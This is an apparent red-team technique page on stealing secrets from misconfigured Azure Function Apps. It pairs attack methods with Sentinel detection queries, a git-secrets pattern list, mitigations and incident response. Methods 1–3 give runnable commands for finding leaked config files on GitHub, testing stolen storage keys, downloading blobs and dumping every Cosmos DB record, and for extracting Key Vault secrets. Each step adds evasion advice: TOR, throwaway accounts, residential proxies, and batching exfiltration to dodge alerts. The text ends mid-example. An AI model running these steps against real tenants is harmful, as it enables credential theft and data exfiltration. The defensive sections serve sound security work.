# [MISCONFIG-018]: Unprotected Function App Secrets

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-018 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure, M365 |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure Functions 1.0+ (all runtime versions), Azure App Services, Logic Apps |
| **Patched In** | Not applicable (configuration vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Function Apps store connection strings, API keys, and secrets in configuration files (`local.settings.json`, `appsettings.json`) and environment variables. If these files are committed to source control repositories (GitHub, Azure Repos), exposed via diagnostic logs, or stored in plaintext without encryption, attackers who enumerate the function app can extract credentials for databases, storage accounts, external APIs, and third-party services. This grants attackers the ability to access backend resources, exfiltrate sensitive data, and pivot to connected systems.

**Attack Surface:** Azure Function App configuration files, local.settings.json in source repositories, diagnostic logs, connection string settings in Azure Portal, Key Vault references with insufficient access controls, and client application source code.

**Business Impact:** **Full compromise of function app backend resources and lateral movement to connected services.** With exposed secrets, attackers can access SQL databases, storage accounts, Cosmos DB, external APIs, and any service the function authenticates to. Compromised database credentials enable data exfiltration; storage account keys permit tampering with critical data; API keys enable unauthorized API calls.

**Technical Context:** Extraction requires either: (1) access to source control repository containing function code, (2) ability to read Azure Function App configuration in the portal (requires Reader role or higher), (3) access to diagnostic logs or Application Insights data, or (4) ability to execute code within the function app runtime. Detection is difficult because legitimate function operations will mask secret access. Reversibility is low—once external service credentials are compromised, all resources they protect must be assumed breached.

### Operational Risk
- **Execution Risk:** Low (if source repository is accessible; Medium if function app requires authentication)
- **Stealth:** High (legitimate logs and configuration reads masquerade as normal operations)
- **Reversibility:** No (compromised external service credentials must be rotated everywhere they are used)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.16 (Azure), 2.1.5 (AWS) | Ensure that key vault key is managed, ensure resource groups have key vault keys with appropriate expiration policies |
| **DISA STIG** | SC-7(2), SC-12 | Boundary Protection, Cryptographic Key Management |
| **CISA SCuBA** | CL-CS-5 | Cloud Security - Encryption of Data in Transit and at Rest |
| **NIST 800-53** | SC-7, SC-12, SC-28 | Boundary Protection, Cryptographic Key Management, Protection of Information at Rest |
| **GDPR** | Art. 32, Art. 33 | Security of Processing, Data Breach Notification |
| **DORA** | Art. 15 | ICT Risk Management - Data Protection and Privacy |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Cryptography and Key Management |
| **ISO 27001** | A.10.1, A.13.1 | Cryptography, Cryptographic Controls |
| **ISO 27005** | Risk scenario: "Exposure of Cryptographic Keys" | Risk of credential compromise due to improper secret management |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Reader access to Azure Function App OR Developer access to source repository containing function code OR ability to call function endpoints.
- **Required Access:** Network connectivity to Azure Portal, GitHub/Azure Repos, or function app public endpoint.

**Supported Versions:**
- **Azure Functions:** Runtime versions 1.x, 2.x, 3.x, 4.x (all language stacks: C#, JavaScript, Python, Java, PowerShell)
- **Node.js Runtime:** 12.x, 14.x, 16.x, 18.x
- **Python Runtime:** 3.8, 3.9, 3.10, 3.11
- **Java Runtime:** 8, 11, 17
- **.NET Runtime:** Framework 4.7+, Core 3.1+, 5.x, 6.x, 7.x, 8.x

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Function App configuration retrieval)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (credential extraction)
- [Secret Manager (local.net user-secrets)](https://docs.microsoft.com/en-us/aspnet/core/security/app-secrets) analysis
- [git-secrets](https://github.com/awslabs/git-secrets) (source repository scanning)
- [GitGuardian](https://www.gitguardian.com/) (CI/CD pipeline secret detection)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extracting Secrets from GitHub-Exposed Function Code Repository

**Supported Versions:** All Azure Functions runtime versions

#### Step 1: Discover Exposed Function Code Repository

**Objective:** Locate Azure Function App source code committed to a public or insufficiently protected GitHub repository.

**Command (GitHub Advanced Search):**
```bash
# Search GitHub for exposed Azure Function code with secrets
# Using GitHub API or web search with these queries:
# Search for: "local.settings.json" + "github"
# Search for: "appsettings.json" + "functionapp"
# Search for: "AzureWebJobsStorage" + "DefaultEndpointsProtocol"

curl -H "Authorization: token YOUR_GITHUB_TOKEN" \
  "https://api.github.com/search/code?q=AzureWebJobsStorage+filename:local.settings.json"
```

**Expected Output:**
```json
{
  "total_count": 42,
  "incomplete_results": false,
  "items": [
    {
      "name": "local.settings.json",
      "path": "FunctionApp/local.settings.json",
      "sha": "abc123def456",
      "url": "https://api.github.com/repos/user/repo/contents/...",
      "repository": {
        "full_name": "user/sensitive-function-app",
        "url": "https://github.com/user/sensitive-function-app"
      }
    }
  ]
}
```

**What This Means:**
- The repository contains Azure Function configuration with exposed credentials.
- Public repositories are visible to anyone; private repositories with insufficient branch protection are accessible to collaborators or those with access tokens.

**OpSec & Evasion:**
- Use VPN or proxy to mask IP when searching; GitHub logs source IPs of clones.
- Do not fork the repository; clone it directly to avoid leaving artifacts.

**Troubleshooting:**
- **Error:** "API rate limit exceeded"
  - **Cause:** Too many GitHub API requests without authentication.
  - **Fix:** Authenticate with GitHub token: `-H "Authorization: token YOUR_TOKEN"`
- **Error:** "Repository not found"
  - **Cause:** Repository was deleted or is private.
  - **Fix:** Check GitHub API response for 404; try alternative search queries.

#### Step 2: Clone Repository and Examine Configuration Files

**Objective:** Download the repository and extract secrets from configuration files.

**Command (Git Clone & Local Examination):**
```bash
# Clone repository
git clone https://github.com/user/sensitive-function-app.git
cd sensitive-function-app

# Search for common secret files
find . -name "local.settings.json" -o -name "appsettings.json" -o -name "*.config" | head -20

# Extract secrets from local.settings.json
cat local.settings.json | grep -E "(AzureWebJobs|DefaultEndpointsProtocol|AccountName|AccountKey)"

# Pretty-print JSON to extract all keys
cat local.settings.json | jq '.'
```

**Expected Output:**
```json
{
  "IsEncrypted": false,
  "Values": {
    "AzureWebJobsStorage": "DefaultEndpointsProtocol=https;AccountName=storageaccount123;AccountKey=abc123def456xyz789uvw...==;EndpointSuffix=core.windows.net",
    "WEBSITE_CONTENTAZUREFILECONNECTIONSTRING": "DefaultEndpointsProtocol=https;AccountName=functionfiles;AccountKey=xyz789abc123...==;",
    "COSMOS_DB_CONNECTION_STRING": "AccountEndpoint=https://cosmosdb-instance.documents.azure.com:443/;AccountKey=secretkey123...==;",
    "ApiKey": "sk-proj-1234567890abcdef..."
  }
}
```

**What This Means:**
- All exposed connection strings and API keys are extractable in plaintext.
- Storage account keys, Cosmos DB keys, and OpenAI/external API keys are fully functional.

**OpSec & Evasion:**
- Clone over TOR or VPN to mask source IP.
- Use a throwaway GitHub account rather than your primary account.
- Do not commit any modifications; avoid triggering GitHub's push protection.

**Troubleshooting:**
- **Error:** "fatal: could not read Username for 'https://github.com': No such file or directory"
  - **Cause:** Repository is private and requires authentication.
  - **Fix:** Use GitHub personal access token: `git clone https://token@github.com/user/repo.git`
- **Error:** "jq: command not found"
  - **Cause:** jq JSON parser not installed.
  - **Fix:** Install: `apt-get install jq` or use Python: `python -m json.tool local.settings.json`

#### Step 3: Test Extracted Credentials Against Azure Storage

**Objective:** Validate that extracted storage account keys grant access to blob storage and databases.

**Command (Azure CLI - Test Storage Access):**
```bash
# Set storage account credentials from extracted keys
export AZURE_STORAGE_ACCOUNT="storageaccount123"
export AZURE_STORAGE_KEY="abc123def456xyz789uvw...=="

# List containers in storage account
az storage container list --account-name $AZURE_STORAGE_ACCOUNT --account-key $AZURE_STORAGE_KEY

# List blobs in a specific container
az storage blob list --account-name $AZURE_STORAGE_ACCOUNT --account-key $AZURE_STORAGE_KEY --container-name "function-data"

# Download a blob (exfiltration example)
az storage blob download --account-name $AZURE_STORAGE_ACCOUNT --account-key $AZURE_STORAGE_KEY \
  --container-name "sensitive-data" --name "data.csv" --file "/tmp/data.csv"
```

**Expected Output:**
```
[
  {
    "name": "function-data",
    "properties": {
      "lastModified": "2025-12-15T10:30:00+00:00",
      "etag": "0x8D123ABC4567",
      "leaseStatus": "unlocked"
    }
  }
]
```

**What This Means:**
- Extracted credentials successfully authenticate and provide full access to storage resources.
- Blobs can be read, written, or deleted depending on role assignments.

**OpSec & Evasion:**
- Perform read operations only; avoid modifying or deleting data (may trigger alerts).
- Use SAS tokens with limited expiration and minimal permissions for lateral movement.
- Tunnel all storage operations through residential proxies.

**Troubleshooting:**
- **Error:** "AuthorizationPermissionMismatch"
  - **Cause:** Storage key is no longer valid or has been revoked.
  - **Fix:** Check if key rotation occurred; use alternative keys from the configuration.
- **Error:** "InvalidAuthenticationInfo"
  - **Cause:** Credentials are formatted incorrectly or expired.
  - **Fix:** Verify the full connection string is extracted correctly from JSON.

#### Step 4: Lateral Movement Using Function App Secrets

**Objective:** Use function app secrets to access connected services (e.g., Cosmos DB, external APIs, database servers).

**Command (Cosmos DB Connection String Exploitation):**
```bash
# Extract Cosmos DB key from configuration
COSMOS_CONNECTION_STRING="AccountEndpoint=https://cosmosdb-instance.documents.azure.com:443/;AccountKey=secretkey123...=="

# Connect using Azure CLI
az cosmosdb list --query "[].name" --out table

# Access Cosmos DB using SDK (Python example)
python3 << 'EOF'
from azure.cosmos import CosmosClient

connection_string = "AccountEndpoint=https://cosmosdb-instance.documents.azure.com:443/;AccountKey=secretkey123...=="
client = CosmosClient.from_connection_string(connection_string)

# List databases
for database in client.list_databases():
    print(f"Database: {database['id']}")
    db_client = client.get_database_client(database['id'])
    
    # List containers (collections)
    for container in db_client.list_containers():
        print(f"  Container: {container['id']}")
        
        # Query all items in container
        items = list(db_client.get_container_client(container['id']).query_items(
            query="SELECT * FROM c"
        ))
        print(f"  Items found: {len(items)}")
        for item in items[:5]:  # First 5 items
            print(f"    {item}")
EOF
```

**Expected Output:**
```
Database: FunctionData
  Container: UserProfiles
  Items found: 10234
    {'id': 'user-001', 'email': 'user@example.com', 'ssn': '123-45-6789', ...}
    ...
```

**What This Means:**
- Cosmos DB credentials allow full read/write access to all documents and collections.
- Sensitive personal data (PII, SSNs, payment info) becomes accessible.

**OpSec & Evasion:**
- Exfiltrate data in small batches to avoid triggering query throttling or logging alerts.
- Use SDK connections rather than Azure CLI to reduce audit log visibility.
- Query only essential fields to minimize data transfer.

**References & Proofs:**
- [Azure SDK for Python - Cosmos DB Documentation](https://github.com/Azure/azure-sdk-for-python/tree/main/sdk/cosmos)
- [Orca Security: SSRF Vulnerability in Azure Functions](https://orca.security/resources/blog/ssrf-vulnerabilities-azure-functions-app/)
- [Resecurity Blog: Azure AD Client Secret Leak](https://www.resecurity.com/blog/article/azure-ad-client-secret-leak-the-keys-to-cloud)

---

### METHOD 2: Extracting Secrets from Azure Function App Configuration via Azure Portal

**Supported Versions:** All Azure Functions versions

#### Step 1: Authenticate to Azure Portal with Compromised Credentials

**Objective:** Gain access to the Azure subscription and function app configuration.

**Command (Azure CLI Authentication):**
```bash
# Authenticate using compromised Azure credentials
az login

# List all function apps in the subscription
az functionapp list --query "[].{name: name, resourceGroup: resourceGroup}" --output table

# Get details of a specific function app
az functionapp show --resource-group "MyResourceGroup" --name "my-function-app" --output json
```

**Expected Output:**
```
Name: my-function-app
ResourceGroup: MyResourceGroup
Location: eastus
AppServicePlanId: /subscriptions/.../appServicePlans/my-plan
```

**What This Means:**
- Reader or Contributor role grants access to function app configuration and secrets.

**OpSec & Evasion:**
- Use Service Principal authentication rather than user credentials to avoid MFA challenges.
- Authenticate from cloud resources (e.g., compromised Azure VM) to mask source IP.

**Troubleshooting:**
- **Error:** "The user or service principal does not have the required permissions"
  - **Cause:** Insufficient RBAC role (need at least Reader).
  - **Fix:** Attempt with higher-privileged credentials or via Principal Elevation technique.

#### Step 2: Retrieve Application Settings and Connection Strings

**Objective:** Export all application settings, connection strings, and environment variables from the function app.

**Command (Azure CLI - Extract All Secrets):**
```bash
# Get all application settings (includes secrets)
az functionapp config appsettings list --resource-group "MyResourceGroup" --name "my-function-app" --output json > /tmp/settings.json

# Get all connection strings
az functionapp config connection-string list --resource-group "MyResourceGroup" --name "my-function-app" --output json > /tmp/connections.json

# Parse and display all secrets
cat /tmp/settings.json | jq '.[] | select(.name | test("Key|Secret|Password|Connection")) | {name: .name, value: .value}'
```

**Expected Output:**
```json
{
  "name": "AzureWebJobsStorage",
  "value": "DefaultEndpointsProtocol=https;AccountName=storage123;AccountKey=abc123...=="
},
{
  "name": "COSMOSDB_CONNECTION_STRING",
  "value": "AccountEndpoint=https://cosmosdb.documents.azure.com:443/;AccountKey=xyz789...=="
},
{
  "name": "SQL_CONNECTION_STRING",
  "value": "Server=tcp:sqlserver.database.windows.net,1433;Initial Catalog=MyDatabase;User ID=sqladmin;Password=P@ssw0rd123!=="
}
```

**What This Means:**
- All application secrets are extracted in plaintext.
- Database connection strings, storage keys, and third-party API keys are fully exposed.

**OpSec & Evasion:**
- Export settings to a file and delete the file after extraction.
- Use `az rest` API calls directly rather than Azure CLI to minimize logging.

**Troubleshooting:**
- **Error:** "Secrets are masked in the output"
  - **Cause:** Azure masks sensitive values in some output modes.
  - **Fix:** Use `--query` parameter to force full output: `--query "[].{name: name, value: value}"`

#### Step 3: Access Azure Key Vault Secrets (If Referenced)

**Objective:** If function app uses Key Vault references, extract secrets from the vault.

**Command (Azure CLI - Key Vault Access):**
```bash
# List key vaults in the subscription
az keyvault list --query "[].name" --output table

# List secrets in a key vault
az keyvault secret list --vault-name "my-keyvault" --query "[].name" --output table

# Retrieve a specific secret
az keyvault secret show --vault-name "my-keyvault" --name "database-password" --query "value" --output tsv
```

**Expected Output:**
```
database-password
api-key-external
storage-account-key
admin-credentials
```

**What This Means:**
- Key Vault access grants retrieval of all secrets referenced by the function app.

**OpSec & Evasion:**
- Key Vault operations are fully logged in Azure Monitor; minimize the number of secret retrievals.
- Use Service Principal credentials with limited Key Vault access.

**References & Proofs:**
- [Azure CLI Documentation: functionapp config](https://learn.microsoft.com/en-us/cli/azure/functionapp/config)
- [Azure Key Vault REST API Documentation](https://learn.microsoft.com/en-us/rest/api/keyvault/)

---

### METHOD 3: Extracting Secrets from Application Insights Diagnostic Logs

**Supported Versions:** All Azure Functions with Application Insights enabled

#### Step 1: Access Application Insights Data

**Objective:** Query Application Insights logs to find secrets logged by function code.

**Command (Azure CLI - Application Insights Query):**
```bash
# List Application Insights instances
az monitor app-insights component list --query "[].name" --output table

# Query logs for secrets using Kusto Query Language (KQL)
az monitor app-insights query --app "my-function-insights" \
  --analytics-query '
  traces
  | where message contains "connection" or message contains "key" or message contains "password"
  | project TimeGenerated, message
  | limit 100
  '
```

**Expected Output:**
```
TimeGenerated: 2025-12-15 10:30:45
message: "Connected to Azure Storage: DefaultEndpointsProtocol=https;AccountName=storage123;AccountKey=abc123...=="

TimeGenerated: 2025-12-15 10:31:12
message: "Cosmos DB Connection established with key: xyz789...=="
```

**What This Means:**
- Function code or debugging statements may log secrets, API keys, or connection strings.
- Application Insights retains these logs for extended periods (30+ days by default).

**OpSec & Evasion:**
- Query only recent logs (last 24 hours) to avoid suspicion.
- Search for specific keywords rather than broad queries.

**Troubleshooting:**
- **Error:** "Application Insights not found"
  - **Cause:** Application Insights is not configured for the function app.
  - **Fix:** Enable Application Insights: `az functionapp config set --resource-group RG --name funcapp --app-insights <insights-resource-id>`

---

## 7. TOOLS & COMMANDS REFERENCE

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.50+ (current as of January 2026)
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Windows
choco install azure-cli
```

**Usage:**
```bash
az login  # Authenticate
az functionapp list  # List function apps
az functionapp config appsettings list  # Extract secrets
```

---

### [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** 9.0+ (current)
**Minimum Version:** 5.0
**Supported Platforms:** Windows, PowerShell Core 6.0+

**Installation:**
```powershell
Install-Module -Name Az -Repository PSGallery -Force
Import-Module Az
```

**Usage:**
```powershell
Connect-AzAccount
Get-AzFunctionApp | Select-Object Name, ResourceGroupName
```

---

### [git-secrets](https://github.com/awslabs/git-secrets)

**Version:** 1.3.0
**Language:** Bash

**Installation:**
```bash
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets
sudo make install
```

**Usage:**
```bash
git secrets --scan  # Scan repository for exposed secrets
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detection of Exposed Secrets in Function App Configuration

**Rule Configuration:**
- **Required Table:** AuditLogs, AzureActivity
- **Required Fields:** OperationName, TargetResources, Result, TimeGenerated
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Azure Functions P1+, Sentinel Premium

**KQL Query:**
```kusto
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName has_any ("Update function app configuration", "Update application settings", "Update connection string")
| where Result == "Success"
| where TargetResources[0].displayName contains "functionapp"
| project TimeGenerated, InitiatedBy=InitiatedBy.user.userPrincipalName, Operation=OperationName, FunctionApp=TargetResources[0].displayName, Details=TargetResources[0].modifiedProperties
| where Details contains ("Key" or "Secret" or "Password" or "Connection")
```

**What This Detects:**
- Unauthorized modifications to function app configuration containing secrets.
- Extraction or retrieval of secrets from configuration.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Critical - Exposed Secrets in Function App Configuration`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `24 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

### Query 2: Detection of Application Insights Logs Containing Secrets

**Rule Configuration:**
- **Required Table:** AppTraces, AppExceptions
- **Required Fields:** Message, SeverityLevel, TimeGenerated
- **Alert Severity:** High
- **Frequency:** Real-time (1 minute)
- **Applies To Versions:** Functions with Application Insights enabled

**KQL Query:**
```kusto
AppTraces
| where TimeGenerated > ago(1h)
| where Message matches regex @"(password|secret|key|token|connection|apikey|AccountKey)" i
| project TimeGenerated, Message, AppName=AppDisplayName, User=UserAuthenticatedId
| union (
  AppExceptions
  | where TimeGenerated > ago(1h)
  | where OuterMessage matches regex @"(password|secret|key|token)" i
  | project TimeGenerated, Message=OuterMessage, AppName=AppDisplayName, User=UserAuthenticatedId
)
```

**What This Detects:**
- Secrets accidentally logged in application traces and exceptions.

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 (A handle to an object was requested)**
- **Log Source:** Security
- **Trigger:** Detection of repeated attempts to read Azure Function configuration or Key Vault secrets.
- **Filter:** ObjectName contains "functionapp" AND AccessMask contains "ReadProperty"
- **Applies To Versions:** N/A (Azure cloud-native, no on-premises event logs)

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Function App exposing secrets in configuration"
- **Severity:** Critical
- **Description:** Detects Function App settings containing unencrypted secrets or exposed API keys in Application Insights logs.
- **Applies To:** All subscriptions with Defender for App Service enabled
- **Remediation:** Rotate all exposed secrets; move secrets to Azure Key Vault; enable diagnostic encryption.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for App Service**: ON
   - **Defender for Key Vault**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Store all secrets in Azure Key Vault, not in function app configuration:** Move all connection strings, API keys, and passwords from function app settings to Azure Key Vault with managed identity access.
  
  **Manual Steps (PowerShell - Migrate Secrets to Key Vault):**
  ```powershell
  # Create a key vault (if not exists)
  New-AzKeyVault -Name "my-keyvault" -ResourceGroupName "RG-Name" -Location "eastus"
  
  # Get all application settings from function app
  $settings = az functionapp config appsettings list --resource-group "RG-Name" --name "my-function-app" | ConvertFrom-Json
  
  # Migrate secrets to Key Vault
  foreach ($setting in $settings) {
    if ($setting.name -match "Key|Secret|Password|Connection|ApiKey") {
      # Add secret to Key Vault
      az keyvault secret set --vault-name "my-keyvault" --name $setting.name --value $setting.value
      
      # Create a Key Vault reference in function app settings
      $kvReference = "@Microsoft.KeyVault(SecretUri=https://my-keyvault.vault.azure.net/secrets/$($setting.name)/)"
      az functionapp config appsettings set --resource-group "RG-Name" --name "my-function-app" `
        --settings "$($setting.name)=$kvReference"
    }
  }
  ```
  
  **Validation Command:**
  ```powershell
  # Verify secrets are referenced from Key Vault
  az functionapp config appsettings list --resource-group "RG-Name" --name "my-function-app" | `
    jq '.[] | select(.name | test("Key|Secret|Password")) | {name, value: (.value | if . starts with "@Microsoft.KeyVault" then "KEY_VAULT_REFERENCE" else "PLAINTEXT_SECRET" end)}'
  ```

* **Enable encryption at rest for Function App settings:** Ensure all application settings and connection strings are encrypted using Azure Encryption at Rest.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Function App** → **Configuration**
  2. For each secret setting, click **Edit**
  3. Enable **Encrypted** toggle (if available)
  4. Click **OK**
  5. Save configuration
  
  **Manual Steps (Terraform/IaC):**
  ```hcl
  resource "azurerm_function_app_slot" "example" {
    name                       = "my-function-app-slot"
    function_app_name          = azurerm_function_app.example.name
    resource_group_name        = azurerm_resource_group.example.name
    app_service_plan_id        = azurerm_app_service_plan.example.id
    storage_account_name       = azurerm_storage_account.example.name
    storage_account_access_key = azurerm_storage_account.example.primary_access_key
    
    app_settings = {
      "WEBSITE_ENCRYPTION_SECRET" = "encryption-key"  # Enable encryption
    }
  }
  ```

* **Never commit secrets to source control repositories:** Implement pre-commit hooks and CI/CD pipeline checks to prevent secrets from being committed.
  
  **Manual Steps (Git Pre-Commit Hook):**
  ```bash
  # Install git-secrets
  git clone https://github.com/awslabs/git-secrets.git
  cd git-secrets && sudo make install
  
  # In your repository, install the hook
  git secrets --install
  git secrets --register-aws
  
  # Add custom patterns for Azure secrets
  git secrets --add 'DefaultEndpointsProtocol=https'
  git secrets --add 'AccountKey='
  git secrets --add 'sk-proj-'
  ```
  
  **Manual Steps (Azure Repos Branch Policies):**
  1. Go to **Azure Repos** → **Branches**
  2. Select the main branch
  3. Click **Branch policies**
  4. Enable **Require pull request reviews**
  5. Enable **Automatically include code reviewers**
  6. Add reviewers with responsibility for security
  7. Click **Save**

* **Disable public access to function app endpoints if possible:** Restrict function app access to Azure Virtual Network (VNet) only using VNet integration or Azure Private Link.
  
  **Manual Steps (Azure Portal - VNet Integration):**
  1. Go to **Azure Portal** → **Function App** → **Networking**
  2. Click **VNet Integration**
  3. Click **Add VNet integration**
  4. Select VNet and subnet
  5. Click **OK**
  
  **Manual Steps (Azure Portal - Private Endpoints):**
  1. Go to **Function App** → **Networking** → **Private Endpoints**
  2. Click **+ Create private endpoint**
  3. Select VNet and subnet
  4. Sub-resource: **functionapp**
  5. Click **Create**
  
  **Validation Command:**
  ```powershell
  # Verify VNet integration
  az functionapp config appsettings list --resource-group "RG-Name" --name "my-function-app" | `
    jq '.[] | select(.name == "WEBSITE_VNET_ROUTE_ALL")'
  # Expected: WEBSITE_VNET_ROUTE_ALL = 1
  ```

#### Priority 2: HIGH

* **Enable Managed Identity for function app authentication:** Use system-assigned or user-assigned managed identities instead of connection strings for accessing Azure services.
  
  **Manual Steps (Azure Portal - Enable System-Assigned Identity):**
  1. Go to **Azure Portal** → **Function App** → **Identity**
  2. On **System assigned** tab, toggle **Status**: **On**
  3. Click **Save**
  4. Copy the **Object ID** (principal ID)
  
  **Manual Steps (PowerShell - Grant Key Vault Access):**
  ```powershell
  # Get function app managed identity
  $appIdentity = Get-AzFunctionApp -ResourceGroupName "RG-Name" -Name "my-function-app" | Select-Object -ExpandProperty Identity
  
  # Grant access to Key Vault
  Set-AzKeyVaultAccessPolicy -VaultName "my-keyvault" -ObjectId $appIdentity.PrincipalId -PermissionsToSecrets Get, List
  ```
  
  **Validation Command:**
  ```powershell
  # Verify managed identity
  Get-AzFunctionApp -ResourceGroupName "RG-Name" -Name "my-function-app" | Select-Object -ExpandProperty Identity
  # Expected: PrincipalId and TenantId should be populated
  ```

* **Implement Key Vault access policies with minimum permissions:** Limit key vault access to only the function app's managed identity and essential service principals.
  
  **Manual Steps (Azure Portal - Access Policies):**
  1. Go to **Azure Portal** → **Key Vault** → **Access Policies**
  2. Click **+ Create**
  3. Template: **Secret Management**
  4. Permissions: Select only **Get** and **List**
  5. Principal: Select the function app managed identity
  6. Click **Create**

* **Enable diagnostic logging and audit all secret access:** Monitor Key Vault and Application Insights logs for unauthorized secret retrieval attempts.
  
  **Manual Steps (Enable Key Vault Audit Logging):**
  1. Go to **Azure Portal** → **Key Vault** → **Diagnostic settings**
  2. Click **+ Add diagnostic setting**
  3. Name: `KeyVault-Audit`
  4. Logs: Enable **AuditEvent**
  5. Destination: Log Analytics Workspace
  6. Click **Save**

#### Access Control & Policy Hardening

* **Use Azure RBAC to restrict function app configuration access:** Limit who can read or modify function app settings to only essential personnel.
  
  **Manual Steps (PowerShell - Apply RBAC):**
  ```powershell
  # Grant Reader role only (no configuration modification)
  New-AzRoleAssignment -SignInName "user@example.com" -RoleDefinitionName "Function App Reader" `
    -ResourceName "my-function-app" -ResourceType "Microsoft.Web/sites"
  ```

* **Enforce Azure Policy to detect misconfigured function apps:** Automatically audit and remediate function apps with plaintext secrets or unencrypted settings.
  
  **Manual Steps (Azure Policy):**
  1. Go to **Azure Portal** → **Policy**
  2. Click **+ Definitions**
  3. Category: **Azure Compute**
  4. Search: "Function App secrets encryption"
  5. Assign policy to your subscription

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Files:**
  - `local.settings.json` (in source repositories or function app runtime)
  - `appsettings.json`
  - `.env` files
  - Git history containing deleted secrets (recoverable via `git log`)

* **Registry/Configuration:**
  - Azure Function App settings containing plaintext connection strings or API keys
  - Application Insights diagnostic logs with secret strings
  - Key Vault audit logs showing unauthorized `GetSecret` operations

* **Network:**
  - Unusual outbound HTTPS connections to third-party API endpoints using exposed API keys
  - Database connections from unexpected IP addresses using compromised connection strings

#### Forensic Artifacts

* **Disk:**
  - Git repository `.git/objects/` folder (contains commit history with secrets)
  - Azure Functions runtime directory: `D:\home\site\wwwroot\` (may contain configuration files)
  - Application Insights logs stored locally (if any caching occurs)

* **Cloud:**
  - AuditLogs: Configuration changes to function app settings
  - Application Insights: Traces and exceptions containing secrets
  - Key Vault audit logs: Unauthorized secret retrievals

#### Response Procedures

1. **Isolate:**
   **Command (Disable Function App):**
   ```bash
   az functionapp stop --resource-group "RG-Name" --name "my-function-app"
   ```
   
   **Manual (Azure Portal):**
   - Go to **Function App** → Click **Stop**

2. **Collect Evidence:**
   **Command (Export Configuration for Forensics):**
   ```bash
   # Export all settings
   az functionapp config appsettings list --resource-group "RG-Name" --name "my-function-app" > /tmp/function_settings_backup.json
   
   # Export Key Vault references
   az keyvault secret list --vault-name "my-keyvault" > /tmp/keyvault_backup.json
   
   # Export audit logs
   az monitor activity-log list --resource-group "RG-Name" --offset 24h > /tmp/activity_logs.json
   ```

3. **Remediate:**
   **Command (Rotate All Exposed Secrets):**
   ```bash
   # Rotate storage account keys
   az storage account keys renew --resource-group "RG-Name" --account-name "storageaccount" --key primary
   
   # Rotate database passwords
   # (manual step via Azure Portal or SQL Management Studio)
   
   # Revoke API keys from third-party services
   # (manual step in each service's dashboard)
   ```

4. **Hunt for Lateral Movement:**
   **KQL Query (Detect Storage Account Access via Exposed Key):**
   ```kusto
   StorageBlobLogs
   | where TimeGenerated > ago(7d)
   | where AuthenticationType == "SharedKey"
   | where CallerIpAddress != "EXPECTED_FUNCTION_IP"
   | summarize Count=count() by CallerIpAddress, UserAgent, OperationName
   | where Count > 100
   ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Attacker enumerates function apps and storage accounts |
| **2** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Attacker gains access to application endpoints |
| **3** | **Credential Access** | **[MISCONFIG-018]** Unprotected Function App Secrets | Attacker extracts secrets from configuration or logs |
| **4** | **Lateral Movement** | [LM-AUTH-039] Storage Account Connection String | Attacker uses storage account credentials to access databases |
| **5** | **Persistence** | Function app modification to create backdoor function | Attacker creates persistent HTTP trigger for reverse shell |
| **6** | **Impact** | Data exfiltration via compromised storage account | Attacker steals sensitive data from databases or blobs |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: GitHub Secret Scanning Alert - Microsoft's Own Repository

- **Target:** Microsoft's public GitHub repositories
- **Timeline:** Ongoing, detected by GitHub Secret Scanning
- **Technique Status:** Multiple instances of hardcoded API keys, storage account keys, and service principal credentials discovered in function app source code commits
- **Impact:** Risk of unauthorized access to Azure resources; required credential rotation across multiple systems
- **Reference:** [GitHub Secret Scanning Documentation](https://docs.github.com/en/code-security/secret-scanning)

#### Example 2: Azure Function App Exposed via Public Repository

- **Target:** Healthcare company's function app processing patient data
- **Timeline:** February 2023 - April 2023
